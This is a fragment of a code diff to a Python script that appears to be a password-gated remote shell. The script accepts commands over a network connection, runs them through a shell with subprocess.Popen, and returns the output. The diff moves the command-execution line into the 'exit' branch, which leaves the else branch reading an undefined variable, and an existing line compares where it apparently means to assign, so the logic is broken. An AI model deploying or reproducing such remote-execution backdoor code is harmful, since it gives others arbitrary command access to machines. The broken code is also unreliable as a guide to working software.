@@ -38,12 +38,12 @@ while passwords_match == True:
     command = command.decode()
     if command == "exit":
         passwords_match == False
+        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
         client.close()
         passwords_match, client = lookForConnection(server, passwords_match)
         checkPass(password, client)
         print(passwords_match)
     else:
-        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
         output = op.stdout.read()
         output_error = op.stderr.read()
         print("[-] Sending response...")
